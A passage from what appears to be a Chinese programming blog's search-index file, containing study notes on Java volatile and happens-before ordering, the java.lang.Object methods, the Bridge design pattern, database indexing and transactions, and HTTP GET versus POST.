&#125;&#125; 注意totalDays()方法在开始时读取days到total变量。当读取days值时，years和months也会从主存中读取，因此你可以通过上面的读取步骤读到所有变量的最新值。 指令重排为了性能，Java VM和CPU是允许重排程序中的指令的，只要语义含义保持不变。举个例子，看看下面的指令：12345int a = 1;int b = 2;a++;b++; 在不丢失语义含义的情况下，上述指令可能被重排成下列指令序列：12345int a = 1;a++;int b = 2;b++; 但对于volatitle变量来说，指令重排是一个挑战，让我们来看一下上述MyClass的例子123456789101112public class MyClass &#123; private int years; private int months private volatile int days; public void update(int years, int months, int days)&#123; this.years = years; this.months = months; this.days = days; &#125;&#125; 当写入days时，也会同时写入years和months到主存。但是如果Java VM重排指令如下：12345public void update(int years, int months, int days)&#123; this.days = days; this.months = months; this.years = years;&#125; 当days修改时，months和years也会写入主存，但是这次days写入发生在years和months之前，因此这个新值对其他线程不可见，这个语义含义已经被改变了。 特别注意，在写入时，把volatitle变量写入放在最后，这样当运行到volatitle变量写入时，会同时把其他非volatitle写入主存，但当volatitle写在最开始时，后面的非volatitle便不会写入最新值。读取相反，将volatitle读取放在最前，线程会读取所有值最新的主存值，如果放在最后面，那么前面读取的变量不是从主存直接读取的。 Happens-Before为了解决指令重组问题，Java volatitle关键字除了可见性保证，还给了一个happens-before保证，happens-before保证如下： 如果读写发生在写入volatitle变量之前，那么读写其他变量的指令不能被重组到写入volatitle变量之后。写入volatitle变量之前的读写被保证happens before写volatitle变量。需要注意，写入volatitle变量之后的读写其他变量仍然有可能被重组到写入volatitle变量之前。因此From after to before is allowed, but from before to after is not allowed（volatitle写操作之后的指令被重组到写之前是允许的，而写操作之前的指令不允许被重组到写之后） 读volatitle变量之后的读写操作不能被重组到volatitle之前，但同样注意发生在读volatitle之前的指令可以重组到读volatitle之后。因此From before to after is allowed, but from after to before is not allowed(volatitle读之前的指令被重组到读之后值允许的，而读操作之后的指令不允许被重组到读值前) Reads from and writes to other variables cannot be reordered to occur after a write to a volatile variable, if the reads / writes originally occurred before the write to the volatile variable.The reads / writes before a write to a volatile variable are guaranteed to “happen before” the write to the volatile variable. Notice that it is still possible for e.g. reads / writes of other variables located after a write to a volatile to be reordered to occur before that write to the volatile. Just not the other way around. From after to before is allowed, but from before to after is not allowed Reads from and writes to other variables cannot be reordered to occur before a read of a volatile variable, if the reads / writes originally occurred after the read of the volatile variable. Notice that it is possible for reads of other variables that occur before the read of a volatile variable can be reordered to occur after the read of the volatile. Just not the other way around. From before to after is allowed, but from after to before is not allowed 重点解释一下这两个保证：对于volatitle写来说，如果写之前的指令被重组到写之后，那么当执行到volatitle时，最新值就不能被立刻写入主存；但写之后的指令被重组到写之前是没有影响的，因为写之后的指令最终还是要被写到主存，只是重组之后提前将新值写入主存。对于volatitle读来说，如果读之后的指令被重组到读之前，那么指令没有获取最新值，因为只有到volatitle读执行时才重读所有变量的主存值，比如当years读取发生volatitle days之后，那么执行到volatitle days会刷新years的值，但years被重组到volatitle days之前，years的值没有刷新；相反，如果读取years在volatitle days之前，被重组到之后，它会读到最新值，这正是我们希望的结果。 volatile is Not Always Enough当多个线程都需要对一个volatitle变量进行写入，且写入之前需要依赖volatitle之前的值，这时候就会出现竞争条件： 想象一下，如果线程1读取一个shared counter值到自己CPU Cache中，开始值为0，然后increment该值为1，但没有把改变的值写入主存；然后线程2也从主存中读取counter，由于线程1没有将改变的值写入主存，此时线程2读到的值为0，它也对值进行increment后值变为1，此时线程2也没有将值写入主存，就像这样: 线程1和线程2几乎不同步，而我们希望的是进行两次加操作后值为2，但线程1和线程2的CPU Cache中counter都是1，即使我们将它们的值写入到主存，结果仍然不对，这都是volatile is Not Always Enough When is volatile Enough?既然出现了上诉情况，那么如果解决这个问题？之前volatitle已经明显不够，那么这时候可以使用Java另外一个关键字synchronized去保证读取变量和写入变量是原子性的操作。上诉的volatitle读写操作并不会产生线程阻塞，使用synchronized保证临界区读写不出现上述问题，但这样会导致线程阻塞。另外也可以使用java.util.concurrent package里面的AtomicLong or AtomicReference或者其他。 在这样的情况下，只有一个线程允许对volatitle变量进行读写操作，其他线程只允许读取，这样即保证读取最新的值，也保证直接写入主存。但是光有synchronized并不能保证可见性。 性能问题之前已经说过，volatitle的读写都要直接接触主存，那么与读写CPU Cache相比，开销增大许多倍，放一张计算机各级缓存以及主存的读取速度比较: 参考链接 Java Volatile Keyword]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>线程</tag>
        <tag>Happens-Before</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java Object]]></title>
    <url>%2F2018%2F04%2F28%2FJavaObject%2F</url>
    <content type="text"><![CDATA[Obejct简介Object类是Java中所有类的基类，在编译时会自动导入，位于java.lang包中，而Object中具有的属性和行为，是Java语言设计背后的思维体现。Object类中的大部分方法都是native方法，用此关键字修饰的方法是Java中的本地方法，一般是用C/C++语言来实现。 native 关键字native是与C++联合开发的时候用的！java自己开发不用的！使用native关键字说明这个方法是原生函数，也就是这个方法是用C/C++语言实现的，并且被编译成了DLL，由java去调用。 这些函数的实现体在DLL中，JDK的源代码中并不包含，你应该是看不到的。对于不同的平台它们也是不同的。这也是java的底层机制，实际上java就是在不同的平台上调用不同的native方法实现对操作系统的访问的。native 是用做java 和其他语言（如c++）进行协作时用的 也就是native 后的函数的实现不是用java写的。native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。 Object 构造函数大部分情况下，Java中通过形如 new A(args..)形式创建一个属于该类型的对象。其中A即是类名，A(args..)即此类定义中相对应的构造函数。通过此种形式创建的对象都是通过类中的构造函数完成。为体现此特性，Java中规定：在类定义过程中，对于未定义构造函数的类，默认会有一个无参数的构造函数，作为所有类的基类，Object类自然要反映出此特性，在源码中，未给出Object类构造函数定义，但实际上，此构造函数是存在的。 当然，并不是所有的类都是通过此种方式去构建，也自然的，并不是所有的类构造函数都是public registerNatives()1234private static native void registerNatives();static &#123; registerNatives();&#125; 该方法主要作用是将C/C++中的方法映射到Java中的native方法，实现方法命名的解耦。registerNatives的修饰为private，因此该方法只在Object中使用，而接下来的static代码块在类加载的时候加载调用registerNatives方法。可以理解为这是Java在为使用底层做准备。 getClass()1public final native Class&lt;?&gt; getClass(); 该方法返回该对象的Class，同时可以直接通过Object.class来返回相同结果。例如：123456package com.fenlan.base;public class Test &#123; public static void main(String[] args) &#123; System.out.println(Test.class); &#125;&#125; 该结果返回class com.fenlan.base.Test，这是这个对象运行时class hashCode()1public native int hashCode(); 该方法返回对象的hash整型码值，关于hashCode()方法的介绍，在这里有深入说明，为对象设置hash值是为了支持hash tables 诸如HashMap、HashSet。hashCode()和equals()方法是经常被重写的方法，具体的重写准则如下: 在Java应用程序程序执行期间，对于同一对象多次调用hashCode()方法时，其返回的哈希码是相同的，前提是将对象进行equals比较时所用的标尺信息未做修改。在Java应用程序的一次执行到另外一次执行，同一对象的hashCode()返回的哈希码无须保持一致； 如果两个对象相等（依据：调用equals()方法），那么这两个对象调用hashCode()返回的哈希码也必须相等； 反之，两个对象调用hasCode()返回的哈希码相等，这两个对象不一定相等。程序员应该意识到，为不相等的对象生成不同的整数结果可能会提高散列表的性能。 equals()123public boolean equals(Object obj) &#123; return (this == obj);&#125; ==与equals在Java中经常被使用，大家也都知道==与equals的区别：==表示的是变量值完成相同(对于基础类型，地址中存储的是值，引用类型则存储指向实际对象的地址)；equals表示的是对象的内容完全相同，此处的内容多指对象的特征/属性。 那么问题来了，Object里面调用了==那为什么还需要equals，equlas()方法的正确理解应该是：判断两个对象是否相等。那么判断对象相等的标尺又是什么？Object判断相等是两个引用具有相同对象地址，但其他情况下我们不需要这么严格的要求，诸如两个类只要某些属性相同就可以认为是相等的，那么就需要重写equals。 clone()1protected native Object clone() throws CloneNotSupportedException; 克隆方法是返回一个当前对象的拷贝，而这里的拷贝精确定义需要依赖这个对象的类定义。 toString()123public String toString() &#123; return getClass().getName() + "@" + Integer.toHexString(hashCode());&#125; 返回一个表示当前对象的字符串，通过这个这个字符串可以简单的表示一些对象信息，为了更多的展示对象信息，可以选择重写该方法。默认情况下返回当前对象的类名和十六进制的hashCode。 notify()1public final native void notify(); 该方法唤醒一个等待在this object&#39;s monitor的单线程。如果有多个线程等待这个对象，那么唤醒其中一个。而Object&#39;s monitor中的线程是之前调用了wait方法。此外其他的说明参考源码注释。 Wakes up a single thread that is waiting on this object’s monitor. If any threads are waiting on this object, one of them is chosen to be awakened. The choice is arbitrary and occurs atthe discretion of the implementation. A thread waits on an object’s monitor by calling one of the {@code wait} methods. This method should only be called by a thread that is the owner of this object’s monitor. A thread becomes the owner of the object’s monitor in one of three ways: By executing a synchronized instance method of that object. By executing the body of a {@code synchronized} statement that synchronizes on the object. For objects of type {@code Class,} by executing a synchronized static method of that class. Only one thread at a time can own an object’s monitor. notifyAll()1public final native void notifyAll(); 该方法唤醒所有等待在Object&#39;s monitor的线程。具体的notify和notifyAll参考其他文章。 wait()1public final native void wait(long timeout) throws InterruptedException; 让当前线程等待直到其他线程调用notify()并选择当前对象或者notifyAll()又或者指定等待时间过去。此外，一个线程在等待过程中被中断，会抛出中断异常。 finalize()1protected void finalize() throws Throwable &#123; &#125; 在垃圾回收时确定没有引用在这个对象上时会调用这个方法。子类重写该方法决定如何去清理这个对象。 参考链接 Java-Object类源码解析 java native关键字 java object类详解]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Object</tag>
        <tag>线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式-桥接]]></title>
    <url>%2F2018%2F04%2F16%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A1%A5%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[概念桥接模式(Bridge)是用于把抽象化和实现化解耦，使得两者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化的桥接结构来实现两者的解耦。 桥接意图 : 将抽象部分与实现部分分离，使它们都可以独立的变化主要解决 : 在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活何时使用 : 实现系统可能有多个角度分类，每一种角度都可能变化如何解决 : 把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合主要代码 : 抽象类依赖实现类桥接优点 : 1、抽象和实现的分离。 2、优秀的扩展能力。 3、实现细节对客户透明桥接缺点 : 桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程 例子一我们需要画出一个红色的圆、绿色的圆、红色的正方形、绿色的正方形。在这个例子中，有两个变化的方面，一个是形状、一个是颜色。 普通的设计是这样的 : 有一个圆类和一个正方形类实现Shape类，而圆类下面有两个子类，红色圆和绿色圆；正方形类下面有两个子类，红色正方形、绿色正方形。但是这样的设计会出现的问题是，当我需要添加一个其他变化的颜色时，诸如蓝色，那么情况会非常糟糕。我们需要在每个形状的下面重新添加一个蓝色形状的实现。这就是桥接定义的变化。 为了解决这个问题，我们需要做的事情是将这两个变化放在抽象层， 补充一下，图片有点问题，其中Shape和Color都是抽象的，桥接的抽象独立变化，就是指的Shape和Color可以独立表化而不影响彼此。 例子二拿汽车在路上行驶的来说。既有小汽车又有公共汽车，它们都不但能在市区中的公路上行驶，也能在高速公路上行驶。这你会发现，对于交通工具（汽车）有不同的类型，它们所行驶的环境（路）也有不同类型，在软件系统中就要适应两个方面（不同车型，不同道路）的变化，怎样实现才能应对这种变化呢？ 比较传统的做法 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 //基类 路class Road &#123; void run() &#123; System.out.println("路"); &#125;&#125;//市区街道class Street extends Road &#123; void run() &#123; System.out.println("市区街道"); &#125;&#125;//高速公路class SpeedWay extends Road &#123; void run() &#123; System.out.println("高速公路"); &#125;&#125;//小汽车在市区街道行驶class CarOnStreet extends Street &#123; void run() &#123; System.out.println("小汽车在市区街道行驶"); &#125;&#125;//小汽车在高速公路行驶class CarOnSpeedWay extends SpeedWay &#123; void run() &#123; System.out.println("小汽车在高速公路行驶"); &#125;&#125;//公交车在市区街道行驶class BusOnStreet extends Street &#123; void run() &#123; System.out.println("公交车在市区街道行驶"); &#125;&#125;//公交车在高速公路行驶class BusOnSpeedWay extends SpeedWay &#123; void run() &#123; System.out.println("公交车在高速公路行驶"); &#125;&#125;//测试public static void main(String[] args) &#123; //小汽车在高速公路行驶 CarOnSpeedWay carOnSpeedWay = new CarOnSpeedWay(); carOnSpeedWay.run(); //公交车在市区街道行驶 BusOnStreet busOnStreet = new BusOnStreet(); busOnStreet.run();&#125; 但是我们说这样的设计是脆弱的，仔细分析就可以发现，它还是存在很多问题，首先它在遵循开放-封闭原则的同时，违背了类的单一职责原则，即一个类只有一个引起它变化的原因，而这里引起变化的原因却有两个，即路类型的变化和汽车类型的变化；其次是重复代码会很多，不同的汽车在不同的路上行驶也会有一部分的代码是相同的； 再次是类的结构过于复杂，继承关系太多，难于维护，最后最致命的一点是扩展性太差。如果变化沿着汽车的类型和不同的道路两个方向变化，我们会看到这个类的结构会迅速的变庞大。 应用桥接模式来实现重新设计 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253abstract class AbstractRoad&#123; AbstractCar aCar; void run()&#123;&#125;;&#125;abstract class AbstractCar&#123; void run()&#123;&#125;;&#125;class Street extends AbstractRoad&#123; @Override void run() &#123; // TODO Auto-generated method stub super.run(); aCar.run(); System.out.println("在市区街道行驶"); &#125;&#125;class SpeedWay extends AbstractRoad&#123; @Override void run() &#123; // TODO Auto-generated method stub super.run(); aCar.run(); System.out.println("在高速公路行驶"); &#125;&#125;class Car extends AbstractCar&#123; @Override void run() &#123; // TODO Auto-generated method stub super.run(); System.out.print("小汽车"); &#125;&#125;class Bus extends AbstractCar&#123; @Override void run() &#123; // TODO Auto-generated method stub super.run(); System.out.print("公交车"); &#125;&#125;public static void main(String[] args)&#123; AbstractRoad speedWay = new SpeedWay(); speedWay.aCar = new Car(); speedWay.run(); AbstractRoad street = new Street(); street.aCar = new Bus(); street.run();&#125; 这里将Road 和 Car单独抽象，那么其中Road变化和Car变化，都不会影响相互的代码，也没有出现代码重复。通过对象组合的方式，Bridge 模式把两个角色之间的继承关系改为了耦合的关系，从而使这两者可以从容自若的各自独立的变化，这也是Bridge模式的本意。 这样增加了客户程序与路与汽车的耦合。其实这样的担心是没有必要的，因为这种耦合性是由于对象的创建所带来的，完全可以用创建型模式去解决。在应用时结合创建型设计模式来处理具体的问题。 例子三你有一个电视机的接口，还有一个遥控器的抽象类。我们都知道，将它们中任何一个定义为一个具体类都不是好办法，因为其它厂家会有不同的实现方法。 代码实现首先定义电视机的接口：ITV12345public interface ITV &#123; public void on(); public void off(); public void switchChannel(int channel);&#125; 实现三星的 ITV 接口12345678910111213141516public class SamsungTV implements ITV &#123; @Override public void on() &#123; System.out.println("Samsung is turned on."); &#125; @Override public void off() &#123; System.out.println("Samsung is turned off."); &#125; @Override public void switchChannel(int channel) &#123; System.out.println("Samsung: channel - " + channel); &#125;&#125; 再实现索尼的ITV接口1234567891011121314151617public class SonyTV implements ITV &#123; @Override public void on() &#123; System.out.println("Sony is turned on."); &#125; @Override public void off() &#123; System.out.println("Sony is turned off."); &#125; @Override public void switchChannel(int channel) &#123; System.out.println("Sony: channel - " + channel); &#125;&#125; 遥控器要包含对TV的引用1234567891011121314151617181920public abstract class AbstractRemoteControl &#123; private ITV tv; public AbstractRemoteControl(ITV tv)&#123; this.tv = tv; &#125; public void turnOn()&#123; tv.on(); &#125; public void turnOff()&#123; tv.off(); &#125; public void setChannel(int channel)&#123; tv.switchChannel(channel); &#125;&#125; 定义遥控器的具体类1234567891011public class LogitechRemoteControl extends AbstractRemoteControl &#123; public LogitechRemoteControl(ITV tv) &#123; super(tv); &#125; public void setChannelKeyboard(int channel)&#123; setChannel(channel); System.out.println("Logitech use keyword to set channel."); &#125;&#125; 1234567public class Main &#123; public static void main(String[] args)&#123; ITV tv = new SonyTV(); LogitechRemoteControl lrc = new LogitechRemoteControl(tv); lrc.setChannelKeyboard(100); &#125;&#125; 参考链接 Java设计模式-桥接模式 桥接模式 讲故事，学（Java）设计模式—桥接模式]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>桥接</tag>
        <tag>抽象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库大杂烩]]></title>
    <url>%2F2018%2F04%2F13%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%84%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[索引顺序索引聚集索引： 如果包含记录的文件按照某个搜索码指定的顺序排序，那么该搜索码对应的索引称为聚集索引。非聚集索引： 搜索码指定的顺序与文件中记录的物理顺序不同的索引称为非聚集索引。 诸如在大学教师记录文件中，用教师ID作为搜索码，记录按照该搜索码顺序存放。 稠密索引(dense index) : 在稠密索引中，文件中的每一个搜索码值都有一个索引项。在稠密聚集索引中，索引项包括搜索码值以及指向具有该搜索码的第一条数据记录的指针。具有相同搜索码值的其余记录顺序地存储在第一条数据记录之后，由于该索引是聚集索引，因此记录根据相同的搜索码值排序。而在稠密非聚集索引中，索引必须存储指向所有具有相同搜索码值的记录项的指针列表。 稠密聚集索引具有相同搜索码值的记录按照指定顺序存储；但是稠密非聚集索引必须存储指向一个指针列表，这个列表里面有具有相同搜索码值的记录指针。聚集索引只存储第一条记录的指针，其他的按照顺序查找，非聚集索引就要记录一个指针表。 稀疏索引(sparse index)： 在稀疏索引中，只为搜索码的某些值建立索引索引项。只有当记录按照搜索码排列顺序存储时才能使用稀疏索引，也就是说，只有索引是聚集索引时才能使用稀疏索引。和稠密索引一样，每个索引项也包括一个搜索码值和指向该搜索码值的第一条记录的指针。为了定位一条记录，我们获取查询记录的搜索码值，再比较索引项中等于或者小于其搜索码值的最大项，然后从该索引项指向的记录开始，沿着文件中的指针查找，直到找到所需记录为止。 就像图中，索引项中没有为每个搜索码(即右边表格中第二列)设立索引项，但这需要保证这些记录按照搜索码顺序排列才行。 多级索引：在外层构建稀疏索引，通过二分查找找到外层索引，外层索引指向内层索引表，内层索引表再找到指定的索引项，最后去定位到记录。 辅助索引： 按聚集索引顺序对文件进行顺序扫描是非常有效的，因为文件中记录的物理存储顺序和索引顺序一致。但是当我们新建立一个索引，而这个索引的顺序跟记录的物理存储顺序不一致时，我们就需要一个辅助索引，这个辅助索引指向每一条记录，这个辅助索引的顺序跟我们要新建的索引顺序一致。 从图里面可以看到，我们新建的索引跟blocks的物理存储顺序不一致，为了解决这个问题，中间添加一个辅助索引，这个辅助索引是稠密索引，同时也根据我们新建索引的顺序进行排序。 B+树索引索引顺序文件组织的最大缺点在于，随着文件的增大，索引查找性能和数据顺序扫面性能都会下降。虽然这种性能下降可以通过对文件进行重新组织来弥补，但是我们不希望频繁地进行重组。 B+树(B+ -tress)索引结构是在数据插入和删除的情况下仍能保持其执行效率的几种使用最广泛的索引结构之一。B+树索引采用平衡树结构，其中树根到树叶的每条路径的长度相同。树中每个非叶子节点有n/2~n个子女，其中n对特定的树是固定的。B+树索引是一种多级索引，但是其结构不同与多级索引顺序文件。典型的B+树结点结构如下 : 这是内部结点结构 这是叶子结点结构，其中key都表示搜索码值，而叶子节点的指针是指向记录块(或者是记录行)，而内部结点是指向下一层的结点。注意到叶子结点只使用了n-1个指针来指向记录，最后一个指针指向自己的兄弟结点，即下一个叶子节点，这样是为了将所有的叶子节点串起来，这样可以发现从最左边的节点开始，可以按照搜索码顺序遍历所有记录行，这为按顺序查找所有记录的SQL语句提供了更加高效的方式。 B树索引B树索引和B+树索引相似。两种方法的主要区别在于B树去除了搜索码值存储中冗余。在上面展示的B+树索引中可以看到搜索码3在结点中出现了两次，每个搜索码值都出现在某些叶子结点中，有的还在非叶子结点中重复出现。 在B+树中，搜索码值可能同时出现在非叶子结点和叶子结点中。与B+树不同，B树只允许搜索码值出现一次(如果它们是唯一的)。由于B树中搜索码不重复，因此可以用比相应B+树索引更少的树结点来存储索引。然而在B树中，由于出现在非叶子中的搜索码值不会出现在其他地方，因此我们将不得不在非叶子节点中为每个搜索码增加一个指针域。附加的这些指针指向文件记录或相应搜索码所对应的桶中。 B树叶子结点跟B+树叶子结点一样，不同在于非叶子结点 : 散列索引借鉴Java HashMap的具体实现细节，通过仔细了解HashMap可以更加深入了解散列索引。在此推荐一篇讲述HashMap比较好的文章 Java HashMap工作原理及实现 位图索引 简单解释一下，在图中可以发现gender记录项只有m、f两个值，那么系统为这两个值分别建立一个位图，对于m位图来说，记录有多少，位图就有多少位，只有当第i个记录gender为m时，m位图的第i位为1,其他不是m的记录位全为零。概括的说，位图就是表示某一搜索码值出现在了哪些位置，通过遍历搜索码值的位图来查找，诸如下列SQL语句1SELECT * FROM r WHERE gender = 'f' 这样的查询语句通过遍历f的位图是非常高效的。但是位图只是适用于搜索码值频繁出现，且选项少，这里所说的选项少是指比如记录人的性别只有三个选项:男、女、不知道，这样使用位图再适合不过了。通常情况下，位图可以和一般的B+树索引组合起来使用。 MySQL数据库几个基本的索引类型 普通索引 : 这是最基本的MySQL数据库索引，它没有任何限制。 唯一索引 : 它与前面的普通索引类似，不同的就是：MySQL数据库索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。 主键索引 : 它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引。 组合索引 : 多字段建立索引。 视图视图这么一个概念我一直不太准确理解，各种参考书上说得太正式，导致我越来越蒙。来我们看一看视图的定义： Any relation that is not part of the logical model, but is made visiable to an user as a virtual relation, is called a view翻译过来就是任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系成为视图 在Database System Concepts这本书里面，作者通过一个例子来引出概念，这个例子如下： 当我们有一张表示银行中每个人借贷记录的表，我们需要知道这张表里面的部分信息，而不是全部信息，基于安全原因，我们会给用户透漏诸如借贷人姓名、借贷号，而不给用户透漏借贷量，我们就需要定义一个查询语句，只返回这张表的部分信息。此外我们可能需要其他的信息，而这些信息需要union多张表，但是这样的信息查询又是比较频繁的，我们也需要定义一个查询语句，来返回结果。 基于上述的例子，作者就引出了视图的概念。而我对于这个的理解是：我们需要基于两方面考虑，一个是安全性，当我们在使用mysql数据库的时候，数据库里面总是有一些视图表，里面包含了当前用户的所有数据库信息，诸如有哪些表，表里都有哪些属性这类信息。所有的可视范围在于当前用户的权限之内，权限之外就无法查看到，那么可以使用视图定义一个查询，根据用户权限，返回整个数据库中用户应该看到的东西。另一个考虑是简单性，我的理解是当我们需要较频繁进行一些查询时，我们总是要频繁的编写复杂的查询语句，为了简化，我们把这些频繁查询进行一定程度的封装，给用户展示一个简单的视图名，让用户能够直截了当的理解这个视图的作用，然后直接查询视图结果。 (这一段是我自己的理解，可能有误解)可能有人会这样选择，上述为了简化查询，为什么要使用视图，不直接使用新表，新表的构建通过其他表变化触发。如果我们使用表，那么我们可能要为每个频繁查找的语句创建一个合适的表，这样的后果是，数据库的表增多，而且表与表之间的关系更加复杂。虽然我们在学习数据库的时候常常让其遵守三范式，但这样会导致如果因为前期表的设计有问题，或者后期需要变化表，那么修改起来是一个非常巨大的工程，非常困难。相反视图并不在数据库中以存储的数据值集形式存在，修改起来是很方便的。 此外可能还有一个经常被问的问题是视图什么时候更新？因为视图是一种虚关系，所以是查询时更新，通俗一点就是，当底层的表有修改时，是去触发视图更新，还是当我们要用使用视图的时候更新。答案是后者，因为实质上视图还是一个查询语句，而不是表，每次使用视图，都需要重新执行视图定义的查询 事务事务概念事务是访问并可能更新各种数据项的一个程序执行单元。我们通常要求数据库系统维护事务的以下性质 原子性(Atom)：事务的所有操作在数据库中要么全部正确反映出来，要么完全不反映。 一致性(Consistency)：隔离执行事务时(换言之，在没有其他事务并发执行的情况下)保持数据库的一致性 隔离性(Isolation)：尽管多个事务可能并发执行，但是系统保证，对于任何一对事务Ti和Tj，在Ti看来，Tj要么Ti开始之前已经完成执行，要么在Ti完成孩子后开始执行。因此，每个事务都感觉不到系统中有其他事务在并发地执行。 持久性(Durability)：一个事务成功完成后，它对数据库的改变必须是永久的，即使出现系统故障。 这些性质通常成为ACID特性 事务隔离级别 可串行化(serializable) : 通常保证可串行化调度。然而正如我们将要解释的，一些数据库系统对该隔离性级别的实现在某些情况下允许非可串行化执行。 可重复读(repeatable read) : 只允许读取已经提交数据，而且在一个事务两次读取一个数据项期间，其他事务不得更新该数据。但该事务不要求与其他事务可串行化。 已提交读(read committed) : 只允许读取已提交数据，但不要求可重复度。比如在事务两次读取一个数据项期间，另一个事务更新了该数据并提交。 未提交读(read uncommitted) : 允许读取未提交数据。这是SQL允许的最低一致性级别。 乐观锁和悲观锁为保持数据库事务的隔离性，系统必须对并发事务之间的相互作用加以控制。乐观并发控制(乐观锁)和悲观并发控制(悲观锁)是并发控制主要采用的手段。 乐观锁 : 假定不会发生并发冲突，只是在提交操作时检查是否违反了数据完整性。 悲观锁 : 假定会发生并发冲突，屏蔽一切可能违反数据完整性操作。 补充说明一下，对于悲观锁来说，如果一个事务操作对一个资源应用了锁时，其他事务只能等待该事务解锁后，再尝试对资源上锁。悲观锁主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护的成本低于回滚事务的成本环境中。 相对于悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发生冲突了，则返回用户错误的信息，让用户决定如何去做。 DELETE、DROP、TRUNCATE 想要彻底删除一张表时用drop 想要删除表中的部分数据用delete并带上where 想要删除表中数据而保留表用truncate 超键、候选键、主键、外键分别是什么 超键：在关系中能唯一标识元组的属性集。一个属性可以作为一个超键，多个属性组合在一起也可以作为一个超键 候选键：最小超键，即没有冗余的超键 主键：唯一表示一个元组的键，每个表只有一个主键，且主键不能为空 一个表中存这另一个表的主键，这个键被成为外键 三范式 1NF : 保证数据库表的字段不可再拆分，原子性 2NF : 不包括部分依赖，即没有属性只依赖主码的一部分 3NF : 表中不存在可以确定其他非关键字的非键字段 补充 1NF 消除非主属性对码的部分函数依赖就是 2NF2NF 消除非主属性对码的传递函数依赖就是 3NF3NF 消除了主属性对码的部分和传递函数依赖就是 BCNF 个人声明由于文章里面的图片基本上都是在网上找的，所以可能会出现一段时间后，图片链接失效了，无法显示，如果出现这种情况，请给我留言!!!谢谢!!!]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>索引</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GET vs POST]]></title>
    <url>%2F2018%2F04%2F13%2FGET_POST%2F</url>
    <content type="text"><![CDATA[在综合考虑下，决定复习一些Web方向的东西，以备不时之需。。。。 What is HTTP?HTTP全称Hypertext Transfer Protocol(就是中文常说的超文本传输协议)，这个协议是为了客户端和服务端能进行通信。HTTP是客户端和服务端进行请求响应过程的协议，客户端发送请求，服务端响应这个请求并返回信息。通常一个web浏览器作为一个客户端，而一台提供web服务的机器作为服务端。 Two HTTP Request Methods: GET and POST两个非常常用的请求响应方法 : GET and POST。 GET- Requests data from a specified resource POST- Submits data to be processed to a specified resource The GET MethodGET请求方法会将请求信息放在URL中1/test/demo_form.php?name1=value1&amp;name2=value2 GET其他特性： GET请求能被缓存 GET请求会保留在浏览器的历史记录中 GET请求可以被标为书签 GET请求不应该用在处理敏感数据时候 GET请求有长度限制 GET只应该用在取回数据 总的来说，由于GET请求数据被放在URL中，以及它能缓存，便导致了上述的其他特性。诸如GET请求会保留在浏览器的历史记录中 GET请求可以被标为书签 GET请求不应该用在处理敏感数据时候这三条就是因为GET请求会被缓存，且请求数据在URL中，又因为浏览器或者说操作系统对URL的长度有要求，所以GET请求有长度限制。 The POST MethodPOST请求包含的数据放在了HTTP数据报中123POST /test/demo_form.php HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 POST其他特性： POST请求不会被缓存 POST请求不会保留在浏览器历史记录中 POST请求不会被标记为书签 POST请求对数据长度没有限制 Compare GET vs. POST GET POST 返回/回退 没有任何影响(因为有缓存机制) 数据会被重新提交(浏览器会提醒用户数据会被重新提交) 书签 可以作为书签 不能作为书签 缓存 可以被缓存 不能被缓存 编码类型 application/x-www-form-urlencoded application/x-www-form-urlencoded or multipart/form-data. Use multipart encoding for binary data 历史记录 参数会保留在浏览器历史记录中 参数不会保留在历史记录中 数据长度限制 GET数据会放在URL中，URL的最大长度为2048个字符 没有限制 数据类型限制 只允许ASCII字符 没有限制 安全性 GET数据安全性低于PSOT，因为它将数据放入URL(一定不用GET发送密码或者其他敏感数据) POST安全性略高于GET，它的数据不会保留在浏览器历史中，也不会保留在服务器日志文件中(但不是绝对安全，其他人可以截获数据包，分析数据包得到数据) Other HTTP Request Methods Method Description HEAD Same as GET but returns only HTTP headers and no document body PUT Uploads a representation of the specified URI DELETE Deletes the specified resource OPTIONS Returns the HTTP methods that the server supports CONNECT Converts the request connection to a transparent TCP/IP tunnel REST 方法使用标准下列是常用的REST方法定义： GET（SELECT）：从服务器取出资源（一项或多项） POST（CREATE）：在服务器新建一个资源 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源） PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性） DELETE（DELETE）：从服务器删除资源 使用例子： GET /zoos：列出所有动物园 POST /zoos：新建一个动物园 GET /zoos/ID：获取某个指定动物园的信息 PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息 PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息） DELETE /zoos/ID：删除某个动物园 GET /zoos/ID/animals：列出某个指定动物园的所有动物 DELETE 